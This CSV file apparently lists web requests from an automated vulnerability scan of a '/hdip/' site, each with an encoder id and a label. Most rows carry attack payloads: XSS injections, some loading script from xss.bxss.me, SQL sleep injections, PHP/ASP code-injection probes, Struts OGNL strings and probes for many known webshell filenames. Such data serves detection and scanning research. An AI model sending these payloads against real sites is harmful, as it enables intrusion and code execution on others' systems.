requestUrl,encoder,mode_is
/hdip/design/catid_save.php,1036,0
/hdip/fckeditoreditor/filemanager/connectors/php/connector.php,1037,0
/hdip/httpmon.php,1038,0
/hdip/index.php,1039,0
/hdip/jiaoyou.php,1040,0
/hdip/jsoa/wap/action/WapContactAction.do,1041,0
/hdip/lHtFAHa6';select pg_sleep(9); -- /js/vendor.5013bbedf6c0508d32c2.js,1042,0
/hdip/link.php,1043,0
/hdip/login/login_exportHistory.action,1044,0
/hdip/login/login_history.action,1045,0
/hdip/main//1<ScRiPt>RT6y(9990)</ScRiPt>,1046,0
"/hdip/main//;8qLfn
1<ScRiPt>ioEN(9514)</ScRiPt>",1047,0
"/hdip/main//<ScRiPt 
>RT6y(9940)</ScRiPt>",1048,0
"/hdip/main//<ScRiPt 
>ioEN(9922)</ScRiPt>",1049,0
/hdip/main//<ScRiPt/acu src=//xss.bxss.me/t/xss.js,1050,0
/hdip/main//<a HrEF=jaVaScRiPT:>,1051,0
"/hdip/main//<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo=' invalid='9225'>",1052,0
"/hdip/main//<video><source onerror=""javascript:ioEN(9370)"">",1053,0
"/hdip/main/;;Tmp8A
1<ScRiPt>ioEN(9525)</ScRiPt>",1054,0
"/hdip/main/;;o0Y0J
1<ScRiPt>RT6y(9800)</ScRiPt>",1055,0
"/hdip/main/;<ScRiPt 
>RT6y(9675)</ScRiPt>",1056,0
"/hdip/main/;<ScRiPt 
>ioEN(9535)</ScRiPt>",1057,0
/hdip/main/;<a HrEF=jaVaScRiPT:>,1058,0
"/hdip/main/;<img/src="">"" onerror=alert(9988)>",1059,0
/hdip/main/;<img<!-- --> src=x onerror=alert(9493);//><!-- -->,1060,0
/hdip/main/;<img<!-- --> src=x onerror=alert(9642);//><!-- -->,1061,0
/hdip/main/main_list.action,1062,0
"/hdip/main/main_list.action/;xtmDj
1<ScRiPt>x4KL(9646)</ScRiPt>",1063,0
"/hdip/main/main_list.action/<ScRiPt 
>8mS6(9148)</ScRiPt>",1064,0
"/hdip/main/main_list.action/<ScRiPt 
>x4KL(9645)</ScRiPt>",1065,0
/hdip/main/main_list.action/<ScRiPt/acu src=//xss.bxss.me/t/xss.js,1066,0
/hdip/main/main_list.action/<a HrEF=jaVaScRiPT:>,1067,0
"/hdip/main/main_list.action/<img/src=""//xss.bxss.me/t/dot.gif""onload=8mS6(9096)>",1068,0
"/hdip/main/main_list.action/<img/src="">"" onerror=alert(9314)>",1069,0
"/hdip/main/main_list.action/<img/src="">"" onerror=alert(9426)>",1070,0
/hdip/main/main_list.action/<img<!-- --> src=x onerror=alert(9090);//><!-- -->,1071,0
/hdip/main/main_list.action/<img<!-- --> src=x onerror=alert(9950);//><!-- -->,1072,0
"/hdip/main/main_list.action/<video><source onerror=""javascript:x4KL(9540)"">",1073,0
/hdip/member/ajax_membergroup.php,1074,0
/hdip/menu/menu_toMergePage.action,1075,0
/hdip/mobile/browser/WorkflowCenterTreeData.jsp,1076,0
/hdip/mobile/plugin/SyncUserInfo.jsp,1077,0
/hdip/movie/onunload.php,1078,0
/hdip/nagiosql/admin/commandline.php,1079,0
/hdip/pGJrKzPK';select pg_sleep(3); -- /js/vendor.5013bbedf6c0508d32c2.js,1080,0
/hdip/php/bill/list_userinfo.php,1081,0
/hdip/plus/ajax_common.php,1082,0
/hdip/plus/recommend.php,1083,0
/hdip/preview.php,1084,0
/hdip/program/program_list.action,1085,0
/hdip/search.php,1086,0
/hdip/sms.php,1087,0
/hdip/static/,1088,0
"/hdip/static/""+response.write(9071849*9515370)+""/manifest.3ad1d5771e9b13dbdad2.js",1089,0
"/hdip/static/""+response.write(9741165*9885255)+""/app.8673862912f22bcced43.js",1090,0
/hdip/static/';print(md5(acunetix_wvs_security_test));$a='/app.8673862912f22bcced43.js,1091,0
/hdip/static/';print(md5(acunetix_wvs_security_test));$a='/vendor.5013bbedf6c0508d32c2.js,1092,0
"/hdip/static/(select(0)from(select(sleep(21)))v)/*'+(select(0)from(select(sleep(21)))v)+'""+(select(0)from(select(sleep(21)))v)+""*//app.8673862912f22bcced43.js",1093,0
"/hdip/static/(select(0)from(select(sleep(3)))v)/*'+(select(0)from(select(sleep(3)))v)+'""+(select(0)from(select(sleep(3)))v)+""*//app.8673862912f22bcced43.js",1094,0
"/hdip/static/(select(0)from(select(sleep(3)))v)/*'+(select(0)from(select(sleep(3)))v)+'""+(select(0)from(select(sleep(3)))v)+""*//vendor.5013bbedf6c0508d32c2.js",1095,0
"/hdip/static/(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'""+(select(0)from(select(sleep(6)))v)+""*//manifest.3ad1d5771e9b13dbdad2.js",1096,0
/hdip/static//1<ScRiPt>FdIn(9298)</ScRiPt>,1097,0
"/hdip/static//;8pfuF
1<ScRiPt>kwuk(9441)</ScRiPt>",1098,0
"/hdip/static//;Bd2Yi
1<ScRiPt>FdIn(9414)</ScRiPt>",1099,0
"/hdip/static//<ScRiPt 
>FdIn(9735)</ScRiPt>",1100,0
"/hdip/static//<ScRiPt 
>kwuk(9203)</ScRiPt>",1101,0
/hdip/static//<ScRiPt/acu src=//xss.bxss.me/t/xss.js,1102,0
/hdip/static//<a HrEF=jaVaScRiPT:>,1103,0
"/hdip/static//<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo=' invalid='9846'>",1104,0
"/hdip/static//<img/src="">"" onerror=alert(9158)>",1105,0
"/hdip/static//<img/src="">"" onerror=alert(9623)>",1106,0
/hdip/static/79DewJNn';select pg_sleep(6); -- /app.8673862912f22bcced43.js,1107,0
"/hdip/static/;;kemr9
1<ScRiPt>FdIn(9667)</ScRiPt>",1108,0
"/hdip/static/;<ScRiPt 
>FdIn(9788)</ScRiPt>",1109,0
"/hdip/static/;<ScRiPt 
>kwuk(9806)</ScRiPt>",1110,0
/hdip/static/;<a HrEF=jaVaScRiPT:>,1111,0
"/hdip/static/;<img/src=""//xss.bxss.me/t/dot.gif""onload=FdIn(9973)>",1112,0
"/hdip/static/;<img/src="">"" onerror=alert(9193)>",1113,0
"/hdip/static/;<img/src="">"" onerror=alert(9304)>",1114,0
/hdip/static/;<img<!-- --> src=x onerror=alert(9441);//><!-- -->,1115,0
/hdip/static/Aoh6lXn6'));select pg_sleep(6); -- /vendor.5013bbedf6c0508d32c2.js,1116,0
/hdip/static/User/job/lib/AP_Resume_Intention.asp,1117,0
/hdip/static/User/job/lib/AP_Resume_Position.asp,1118,0
/hdip/static/User/job/lib/AP_Resume_workcity.asp,1119,0
"/hdip/static/WebViewJavascriptBridge.js/;FmpGs
1<ScRiPt>4unh(9586)</ScRiPt>",1120,0
"/hdip/static/WebViewJavascriptBridge.js/;T2VfI
1<ScRiPt>avwZ(9378)</ScRiPt>",1121,0
"/hdip/static/WebViewJavascriptBridge.js/<ScRiPt 
>avwZ(9528)</ScRiPt>",1122,0
/hdip/static/WebViewJavascriptBridge.js/<a HrEF=jaVaScRiPT:>,1123,0
"/hdip/static/WebViewJavascriptBridge.js/<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo=' invalid='9137'>",1124,0
"/hdip/static/WebViewJavascriptBridge.js/<img/src=""//xss.bxss.me/t/dot.gif""onload=4unh(9930)>",1125,0
"/hdip/static/WebViewJavascriptBridge.js/<img/src=""//xss.bxss.me/t/dot.gif""onload=avwZ(9892)>",1126,0
"/hdip/static/WebViewJavascriptBridge.js/<img/src="">"" onerror=alert(9848)>",1127,0
"/hdip/static/WebViewJavascriptBridge.js/<video><source onerror=""javascript:avwZ(9421)"">",1128,0
/hdip/static/config-browser/showConfig.action,1129,0
/hdip/static/css/,1130,0
/hdip/static/css//1<ScRiPt>8WwU(9313)</ScRiPt>,1131,0
"/hdip/static/css//;LhFVv
1<ScRiPt>K9QT(9094)</ScRiPt>",1132,0
"/hdip/static/css//;n3IOT
1<ScRiPt>8WwU(9116)</ScRiPt>",1133,0
/hdip/static/css//<,1134,0
"/hdip/static/css//<ScRiPt 
>K9QT(9039)</ScRiPt>",1135,0
/hdip/static/css//<ScRiPt/acu src=//xss.bxss.me/t/xss.js,1136,0
/hdip/static/css//<a HrEF=jaVaScRiPT:>,1137,0
"/hdip/static/css//<img/src="">"" onerror=alert(9471)>",1138,0
"/hdip/static/css//<img/src="">"" onerror=alert(9843)>",1139,0
/hdip/static/css/;1<ScRiPt>K9QT(9018)</ScRiPt>,1140,0
"/hdip/static/css/;<ScRiPt 
>8WwU(9528)</ScRiPt>",1141,0
/hdip/static/css/;<ScRiPt/acu src=//xss.bxss.me/t/xss.js,1142,0
/hdip/static/css/;<a HrEF=jaVaScRiPT:>,1143,0
"/hdip/static/css/;<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo=' invalid='9250'>",1144,0
"/hdip/static/css/;<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo=' invalid='9464'>",1145,0
"/hdip/static/css/;<img/src="">"" onerror=alert(9259)>",1146,0
/hdip/static/css/;<img<!-- --> src=x onerror=alert(9278);//><!-- -->,1147,0
/hdip/static/css/User/job/lib/AP_Resume_Intention.asp,1148,0
/hdip/static/css/User/job/lib/AP_Resume_Position.asp,1149,0
/hdip/static/css/User/job/lib/AP_Resume_workcity.asp,1150,0
/hdip/static/css/app.4d0d1e76ec2e290e2dc385a77e4e97cb.css,1151,0
/hdip/static/css/app.4d0d1e76ec2e290e2dc385a77e4e97cb.cssUser/job/lib/AP_Resume_Intention.asp,1152,0
/hdip/static/css/app.4d0d1e76ec2e290e2dc385a77e4e97cb.cssUser/job/lib/AP_Resume_Position.asp,1153,0
/hdip/static/css/app.4d0d1e76ec2e290e2dc385a77e4e97cb.cssUser/job/lib/AP_Resume_workcity.asp,1154,0
/hdip/static/css/data:image.001,1155,0
/hdip/static/css/data:image.49zXD,1156,0
/hdip/static/css/data:image.MTmNn,1157,0
/hdip/static/css/data:image.RXyPQ,1158,0
/hdip/static/css/data:image.arc,1159,0
/hdip/static/css/data:image.bac,1160,0
/hdip/static/css/data:image.bak,1161,0
/hdip/static/css/data:image.tcEnf,1162,0
/hdip/static/css/data:image.xnSed,1163,0
/hdip/static/css/data:image/,1164,0
/hdip/static/css/data:image/135790864283,1165,0
/hdip/static/css/data:image/2008.php,1166,0
/hdip/static/css/data:image/2009lite.php,1167,0
/hdip/static/css/data:image/2010.php,1168,0
/hdip/static/css/data:image/2011.php,1169,0
/hdip/static/css/data:image/Dbsql.aspsqlroot.asp,1170,0
/hdip/static/css/data:image/DxShell.php,1171,0
/hdip/static/css/data:image/EN,1172,0
/hdip/static/css/data:image/H4ck,1173,0
/hdip/static/css/data:image/JspSpy2010.jsp,1174,0
/hdip/static/css/data:image/MSSQLCrack.php,1175,0
/hdip/static/css/data:image/User/job/lib/AP_Resume_Intention.asp,1176,0
/hdip/static/css/data:image/User/job/lib/AP_Resume_Position.asp,1177,0
/hdip/static/css/data:image/User/job/lib/AP_Resume_workcity.asp,1178,0
/hdip/static/css/data:image/admin.php,1179,0
/hdip/static/css/data:image/admin/login.php,1180,0
/hdip/static/css/data:image/admincp.php,1181,0
/hdip/static/css/data:image/anonymous_test_1571223775208.jpg,1182,0
/hdip/static/css/data:image/anonymous_test_shell_1571223772814.jpg,1183,0
/hdip/static/css/data:image/aspadmin.asp,1184,0
/hdip/static/css/data:image/aspx.aspx,1185,0
/hdip/static/css/data:image/backdoor.jsp,1186,0
/hdip/static/css/data:image/c100.php,1187,0
/hdip/static/css/data:image/c99.php,1188,0
/hdip/static/css/data:image/cmd.asp,1189,0
/hdip/static/css/data:image/cmd.jsp,1190,0
/hdip/static/css/data:image/cmdcmd.jsp,1191,0
/hdip/static/css/data:image/cmdexec.aspx,1192,0
/hdip/static/css/data:image/config-browser/showConfig.action,1193,0
/hdip/static/css/data:image/database.sqlite,1194,0
/hdip/static/css/data:image/db1.sqlite,1195,0
/hdip/static/css/data:image/dede/login.php,1196,0
/hdip/static/css/data:image/egy_spider.php,1197,0
/hdip/static/css/data:image/en.jsp,1198,0
/hdip/static/css/data:image/f4ck.asp,1199,0
/hdip/static/css/data:image/fhTsBXpx,1200,0
/hdip/static/css/data:image/fileupload.aspx,1201,0
/hdip/static/css/data:image/filterleft.jsp,1202,0
/hdip/static/css/data:image/forum.php,1203,0
/hdip/static/css/data:image/ftpsu.asp,1204,0
/hdip/static/css/data:image/fuck.php,1205,0
/hdip/static/css/data:image/fx.php,1206,0
/hdip/static/css/data:image/gogogo.php,1207,0
/hdip/static/css/data:image/hack.php,1208,0
/hdip/static/css/data:image/hack2b.asp,1209,0
/hdip/static/css/data:image/hy.asp,1210,0
/hdip/static/css/data:image/hytop.php,1211,0
/hdip/static/css/data:image/integration/saveGangster.action,1212,0
/hdip/static/css/data:image/jspinfo.jsp,1213,0
/hdip/static/css/data:image/kim.aspx,1214,0
/hdip/static/css/data:image/log.sqlite,1215,0
/hdip/static/css/data:image/logs.sqlite,1216,0
/hdip/static/css/data:image/ma.asp,1217,0
/hdip/static/css/data:image/manage.jsp,1218,0
/hdip/static/css/data:image/manage.php,1219,0
/hdip/static/css/data:image/manage/login.asp,1220,0
/hdip/static/css/data:image/manage/login.jsp,1221,0
/hdip/static/css/data:image/manage/login.php,1222,0
/hdip/static/css/data:image/mssql.asp,1223,0
/hdip/static/css/data:image/mysqlcrack.php,1224,0
/hdip/static/css/data:image/no.jsp,1225,0
/hdip/static/css/data:image/oracle.jsp,1226,0
/hdip/static/css/data:image/phpbackdoor15.php,1227,0
/hdip/static/css/data:image/phpmyadmin,1228,0
/hdip/static/css/data:image/phpspy2010.php,1229,0
/hdip/static/css/data:image/phvayvv.php,1230,0
/hdip/static/css/data:image/piaol.aspx,1231,0
/hdip/static/css/data:image/pimpshell.php,1232,0
"/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==",1233,0
"/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#wr=#context[#parameters.obj[0]].getWriter(),#wr.print(#parameters.content[0]+201+20702),#wr.close(),xx.toString.json",1234,0
"/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==${100002-1+'Anonymous_'+'security_S2015_test'}.action",1235,0
"/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)",1236,0
"/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==User/job/lib/AP_Resume_Intention.asp",1237,0
"/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==User/job/lib/AP_Resume_Position.asp",1238,0
"/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==User/job/lib/AP_Resume_workcity.asp",1239,0
"/hdip/static/css/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAIAAADZF8uwAAAAGUlEQVQYV2M4gwH+YwCGIasIUwhT25BVBADtzYNYrHvv4gAAAABJRU5ErkJggg==struts/webconsole.html",1240,0
/hdip/static/css/data:image/portal/loginForm.jsp,1241,0
/hdip/static/css/data:image/predator.php,1242,0
/hdip/static/css/data:image/qa_bak.php,1243,0
/hdip/static/css/data:image/replace.asp,1244,0
/hdip/static/css/data:image/robots.txt,1245,0
/hdip/static/css/data:image/root.asp,1246,0
/hdip/static/css/data:image/rootkit.asp,1247,0
/hdip/static/css/data:image/saup.asp,1248,0
/hdip/static/css/data:image/serv-u.asp,1249,0
/hdip/static/css/data:image/serv-u.aspx,1250,0
/hdip/static/css/data:image/shell.asp,1251,0
/hdip/static/css/data:image/silic,1252,0
/hdip/static/css/data:image/simoen.aspx,1253,0
/hdip/static/css/data:image/spexec.aspx,1254,0
/hdip/static/css/data:image/spjspshell.jsp,1255,0
/hdip/static/css/data:image/sqljnc.asp,1256,0
/hdip/static/css/data:image/syslogin/login.jsp,1257,0
/hdip/static/css/data:image/system/login.asp,1258,0
/hdip/static/css/data:image/system/login.php,1259,0
/hdip/static/css/data:image/systeminfo.aspx,1260,0
/hdip/static/css/data:image/t00ls.asp,1261,0
/hdip/static/css/data:image/test.jsp,1262,0
/hdip/static/css/data:image/test.php,1263,0
/hdip/static/css/data:image/udfudf.php,1264,0
/hdip/static/css/data:image/unknownfile1,1265,0
/hdip/static/css/data:image/webshell.php,1266,0
/hdip/static/css/data:image/webshellupx8.php,1267,0
/hdip/static/css/data:image/xiao.asp,1268,0
/hdip/static/css/data:image/xiaoma.php,1269,0
/hdip/static/css/data:image/xxoxx.php,1270,0
/hdip/static/css/data:image/yijuhua.asp,1271,0
/hdip/static/css/plus/recommend.php,1272,0
/hdip/static/design/catid_save.php,1273,0
"/hdip/static/fonts//;Ciu6d
1<ScRiPt>JqbH(9923)</ScRiPt>",1274,0
/hdip/static/fonts//<ScRiPt/acu src=//xss.bxss.me/t/xss.js,1275,0
/hdip/static/fonts//<a HrEF=jaVaScRiPT:>,1276,0
"/hdip/static/fonts//<img/src="">"" onerror=alert(9984)>",1277,0
"/hdip/static/fonts//<video><source onerror=""javascript:db5q(9914)"">",1278,0
/hdip/static/fonts/;1<ScRiPt>db5q(9199)</ScRiPt>,1279,0
"/hdip/static/fonts/;;WvzxI
1<ScRiPt>db5q(9656)</ScRiPt>",1280,0
"/hdip/static/fonts/;;sVDlr
1<ScRiPt>JqbH(9146)</ScRiPt>",1281,0
"/hdip/static/fonts/;<ScRiPt 
>JqbH(9576)</ScRiPt>",1282,0
"/hdip/static/fonts/;<img/src=""//xss.bxss.me/t/dot.gif""onload=db5q(9534)>",1283,0
"/hdip/static/fonts/;<img/src="">"" onerror=alert(9166)>",1284,0
/hdip/static/img/,1285,0
/hdip/static/img//1<ScRiPt>7tQ4(9784)</ScRiPt>,1286,0
/hdip/static/img//1<ScRiPt>BW3V(9549)</ScRiPt>,1287,0
"/hdip/static/img//;sDsAs
1<ScRiPt>7tQ4(9761)</ScRiPt>",1288,0
"/hdip/static/img//;vgXBu
1<ScRiPt>BW3V(9955)</ScRiPt>",1289,0
/hdip/static/img//<,1290,0
"/hdip/static/img//<ScRiPt 
>7tQ4(9764)</ScRiPt>",1291,0
/hdip/static/img//<a HrEF=jaVaScRiPT:>,1292,0
"/hdip/static/img//<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo=' invalid='9117'>",1293,0
"/hdip/static/img//<img/src=""//xss.bxss.me/t/dot.gif""onload=BW3V(9977)>",1294,0
"/hdip/static/img//<img/src="">"" onerror=alert(9516)>",1295,0
"/hdip/static/img//<img/src="">"" onerror=alert(9862)>",1296,0
"/hdip/static/img//<video><source onerror=""javascript:BW3V(9598)"">",1297,0
"/hdip/static/img/;;eX132
1<ScRiPt>BW3V(9330)</ScRiPt>",1298,0
"/hdip/static/img/;;umoRk
1<ScRiPt>7tQ4(9743)</ScRiPt>",1299,0
"/hdip/static/img/;<ScRiPt 
>7tQ4(9026)</ScRiPt>",1300,0
"/hdip/static/img/;<ScRiPt 
>BW3V(9306)</ScRiPt>",1301,0
/hdip/static/img/;<ScRiPt/acu src=//xss.bxss.me/t/xss.js,1302,0
"/hdip/static/img/;<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo=' invalid='9015'>",1303,0
"/hdip/static/img/;<img/src=""//xss.bxss.me/t/dot.gif""onload=BW3V(9428)>",1304,0
"/hdip/static/img/;<img/src="">"" onerror=alert(9606)>",1305,0
"/hdip/static/img/;<video><source onerror=""javascript:7tQ4(9001)"">",1306,0
"/hdip/static/img/;<video><source onerror=""javascript:BW3V(9865)"">",1307,0
/hdip/static/img/User/job/lib/AP_Resume_Intention.asp,1308,0
/hdip/static/img/User/job/lib/AP_Resume_Position.asp,1309,0
/hdip/static/img/User/job/lib/AP_Resume_workcity.asp,1310,0
/hdip/static/img/config-browser/showConfig.action,1311,0
/hdip/static/img/plus/recommend.php,1312,0
/hdip/static/irpt/i/modifyserveruserinfo.jsp,1313,0
"/hdip/static/isee.js/;x9rrs
1<ScRiPt>p33I(9871)</ScRiPt>",1314,0
/hdip/static/isee.js/<,1315,0
"/hdip/static/isee.js/<ScRiPt 
>9R5B(9775)</ScRiPt>",1316,0
"/hdip/static/isee.js/<ScRiPt 
>p33I(9345)</ScRiPt>",1317,0
/hdip/static/isee.js/<ScRiPt/acu src=//xss.bxss.me/t/xss.js,1318,0
/hdip/static/isee.js/<a HrEF=jaVaScRiPT:>,1319,0
"/hdip/static/isee.js/<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo=' invalid='9120'>",1320,0
"/hdip/static/isee.js/<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo=' invalid='9677'>",1321,0
"/hdip/static/isee.js/<img/src="">"" onerror=alert(9660)>",1322,0
"/hdip/static/isee.js/<video><source onerror=""javascript:9R5B(9828)"">",1323,0
/hdip/static/js/,1324,0
"/hdip/static/js/""+response.write(9555356*9785166)+"".5013bbedf6c0508d32c2.js",1325,0
"/hdip/static/js/""+response.write(9910402*9918344)+"".8673862912f22bcced43.js",1326,0
"/hdip/static/js/""+response.write(9984660*9534250)+"".5013bbedf6c0508d32c2.js",1327,0
"/hdip/static/js/"";print(md5(acunetix_wvs_security_test));$a="".8673862912f22bcced43.js",1328,0
/hdip/static/js/'+response.write(9555356*9785166)+'.5013bbedf6c0508d32c2.js,1329,0
/hdip/static/js/'+response.write(9910402*9918344)+'.8673862912f22bcced43.js,1330,0
/hdip/static/js/'+response.write(9984660*9534250)+'.5013bbedf6c0508d32c2.js,1331,0
/hdip/static/js/';print(md5(acunetix_wvs_security_test));$a='.3ad1d5771e9b13dbdad2.js,1332,0
/hdip/static/js/';print(md5(acunetix_wvs_security_test));$a='.5013bbedf6c0508d32c2.js,1333,0
"/hdip/static/js/(select(0)from(select(sleep(3)))v)/*'+(select(0)from(select(sleep(3)))v)+'""+(select(0)from(select(sleep(3)))v)+""*/.3ad1d5771e9b13dbdad2.js",1334,0
"/hdip/static/js/(select(0)from(select(sleep(3)))v)/*'+(select(0)from(select(sleep(3)))v)+'""+(select(0)from(select(sleep(3)))v)+""*/.5013bbedf6c0508d32c2.js",1335,0
"/hdip/static/js/(select(0)from(select(sleep(3)))v)/*'+(select(0)from(select(sleep(3)))v)+'""+(select(0)from(select(sleep(3)))v)+""*/.8673862912f22bcced43.js",1336,0
"/hdip/static/js/(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'""+(select(0)from(select(sleep(6)))v)+""*/.3ad1d5771e9b13dbdad2.js",1337,0
/hdip/static/js//1<ScRiPt>a5Il(9055)</ScRiPt>,1338,0
"/hdip/static/js//;0GAwf
1<ScRiPt>pBkA(9194)</ScRiPt>",1339,0
"/hdip/static/js//;kUN8f
1<ScRiPt>a5Il(9780)</ScRiPt>",1340,0
"/hdip/static/js//<ScRiPt 
>a5Il(9197)</ScRiPt>",1341,0
"/hdip/static/js//<ScRiPt 
>pBkA(9005)</ScRiPt>",1342,0
/hdip/static/js//<ScRiPt/acu src=//xss.bxss.me/t/xss.js,1343,0
"/hdip/static/js//<img/src="">"" onerror=alert(9625)>",1344,0
"/hdip/static/js//<video><source onerror=""javascript:a5Il(9576)"">",1345,0
/hdip/static/js/8DKLtk5R';select pg_sleep(6); -- .8673862912f22bcced43.js,1346,0
/hdip/static/js/;1<ScRiPt>pBkA(9964)</ScRiPt>,1347,0
"/hdip/static/js/;;4rMh1
1<ScRiPt>pBkA(9263)</ScRiPt>",1348,0
"/hdip/static/js/;;oW9oS
1<ScRiPt>a5Il(9753)</ScRiPt>",1349,0
/hdip/static/js/;<ScRiPt/acu src=//xss.bxss.me/t/xss.js,1350,0
/hdip/static/js/;<a HrEF=jaVaScRiPT:>,1351,0
"/hdip/static/js/;<img/src=""//xss.bxss.me/t/dot.gif""onload=a5Il(9514)>",1352,0
"/hdip/static/js/;<img/src=""//xss.bxss.me/t/dot.gif""onload=pBkA(9496)>",1353,0
"/hdip/static/js/;<img/src="">"" onerror=alert(9451)>",1354,0
"/hdip/static/js/;<video><source onerror=""javascript:a5Il(9321)"">",1355,0
/hdip/static/js/AXcQC4AS';select pg_sleep(9); -- .5013bbedf6c0508d32c2.js,1356,0
/hdip/static/js/EX1ax07i');select pg_sleep(3); -- .3ad1d5771e9b13dbdad2.js,1357,0
/hdip/static/js/User/job/lib/AP_Resume_Intention.asp,1358,0
/hdip/static/js/User/job/lib/AP_Resume_Position.asp,1359,0
/hdip/static/js/User/job/lib/AP_Resume_workcity.asp,1360,0
/hdip/static/js/Vhg1PjLR'));select pg_sleep(6); -- .8673862912f22bcced43.js,1361,0
/hdip/static/js/app.'+response.write(9856012*9691861)+'f22bcced43.js,1362,0
/hdip/static/js/app.';print(md5(acunetix_wvs_security_test));$a='f22bcced43.js,1363,0
"/hdip/static/js/app.(select(0)from(select(sleep(3)))v)/*'+(select(0)from(select(sleep(3)))v)+'""+(select(0)from(select(sleep(3)))v)+""*/f22bcced43.js",1364,0
"/hdip/static/js/app.(select(0)from(select(sleep(9)))v)/*'+(select(0)from(select(sleep(9)))v)+'""+(select(0)from(select(sleep(9)))v)+""*/f22bcced43.js",1365,0
/hdip/static/js/app.8673862912';print(md5(acunetix_wvs_security_test));$a='.js,1366,0
"/hdip/static/js/app.8673862912(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'""+(select(0)from(select(sleep(6)))v)+""*/.js",1367,0
/hdip/static/js/app.8673862912U4qDe1yU';select pg_sleep(9); -- .js,1368,0
/hdip/static/js/app.8673862912f22bcced43.js/1<ScRiPt>YguE(9958)</ScRiPt>,1369,0
"/hdip/static/js/app.8673862912f22bcced43.js/;NaMbC
1<ScRiPt>YguE(9083)</ScRiPt>",1370,0
